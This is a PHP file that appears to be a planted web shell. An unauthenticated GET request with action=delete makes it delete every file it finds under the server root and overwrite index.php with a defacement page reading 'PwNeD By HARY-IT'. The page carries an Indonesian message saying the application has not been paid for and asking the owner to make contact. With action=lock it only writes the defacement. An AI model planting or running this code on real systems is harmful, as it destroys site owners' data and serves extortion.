 <?php 
ob_start();
  if($_GET['action']=="delete"){

//error_reporting(0);
//if(isset($_GET['action'])){
 // if($_GET['action']=="delete"){

  $folder_path = "/";


$files = glob($folder_path.'/*');

foreach($files as $file) {

  //if(is_file($file))
   
    unlink($file);

$files = fopen("index.php","w");
echo fwrite($files,"<html><link rel='icon'type='image/png' href='https://i.ibb.co/MfCCHp4/Rina-Watih-Lingga-20210530-171350.jpg' /><table width=100% height=100%>   <td align='center'>
    <link href='https://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
    <meta property='og:description' content='Make Your Heart Comfortable'/>
        <meta property='og:title' content='HARY-IT'>
        <meta property='og:image' content='https://i.ibb.co/JcXqmmr/IMG-20200804-WA0032.jpg'>
    <head><title>Touched By ./HARY-IT</title>




</head><body bgcolor='black'><body onmousedown='return false' oncontexmenu='return false' onselectstart='return false'>
<body onclick='playAudio();' class=''><audio id='sec' __idm_id__='823202817'>
        <source src='https://c.top4top.io/m_1999hir3b1.mp3' type='audio/mpeg'>
        </audio>
   <div class='losht'>
   <script>
    var x = document.getElementById('sec');
    function playAudio() {
    x.play();
    }

function myFunction() {
    var element = document.body;
    element.classList.toggle('dark-mode');
    }
    function changeImage() {
    if (document.getElementById('imgClickAndChange').src == 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU')
        {
            document.getElementById('imgClickAndChange').src = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU';
        }
   else
        {
            document.getElementById('imgClickAndChange').src = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU';
        }
    }</script></div></body>
<center>
<br>
<br>
<br>
<center><img style='width:220   px; height:250px' src='https://i.ibb.co/MfCCHp4/Rina-Watih-Lingga-20210530-171350.jpg'><br>



<h1><font face='Iceland' color='white' size='10'>PwNeD By HARY-IT</font></h1>


<font color='silver' size='4'>-| Message: |-
<br>
<font color='red' face='courier new'>'<i>Aplikasi Ini Belum Di Bayar <br>Hubungi Saya Untuk Info Lebih Lanjut!</i>'


<script src='https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js' type='text/javascript'></script>

<br><br>
<font color='silver'>-| HARY-IT |-</font></font></font></font></font></font></center></body></html>");
fclose($files);

}
}












 else if ($_GET['action'] == 'lock') {


$files = fopen("index.php","w");
echo fwrite($files,"<html><link rel='icon'type='image/png' href='https://i.ibb.co/MfCCHp4/Rina-Watih-Lingga-20210530-171350.jpg' /><table width=100% height=100%>   <td align='center'>
    <link href='https://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
    <meta property='og:description' content='Make Your Heart Comfortable'/>
        <meta property='og:title' content='HARY-IT'>
        <meta property='og:image' content='https://i.ibb.co/JcXqmmr/IMG-20200804-WA0032.jpg'>
    <head><title>Touched By ./HARY-IT</title>




</head><body bgcolor='black'><body onmousedown='return false' oncontexmenu='return false' onselectstart='return false'>
<body onclick='playAudio();' class=''><audio id='sec' __idm_id__='823202817'>
        <source src='https://c.top4top.io/m_1999hir3b1.mp3' type='audio/mpeg'>
        </audio>
   <div class='losht'>
   <script>
    var x = document.getElementById('sec');
    function playAudio() {
    x.play();
    }

function myFunction() {
    var element = document.body;
    element.classList.toggle('dark-mode');
    }
    function changeImage() {
    if (document.getElementById('imgClickAndChange').src == 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU')
        {
            document.getElementById('imgClickAndChange').src = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU';
        }
   else
        {
            document.getElementById('imgClickAndChange').src = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVAPAH-s4WkuG09NPjkWf-70IkrnusOjNckg&usqp=CAU';
        }
    }</script></div></body>
<center>
<br>
<br>
<br>
<center><img style='width:220   px; height:250px' src='https://i.ibb.co/MfCCHp4/Rina-Watih-Lingga-20210530-171350.jpg'><br>



<h1><font face='Iceland' color='white' size='10'>PwNeD By HARY-IT</font></h1>


<font color='silver' size='4'>-| Message: |-
<br>
<font color='red' face='courier new'>'<i>Aplikasi Ini Belum Di Bayar <br>Hubungi Saya Untuk Info Lebih Lanjut!</i>'


<script src='https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js' type='text/javascript'></script>

<br><br>
<font color='silver'>-| HARY-IT |-</font></font></font></font></font></font></center></body></html>");
fclose($files);



}


 else{
  echo " <meta http-equiv='refresh' content='0;url=/'>
";


 }

?>
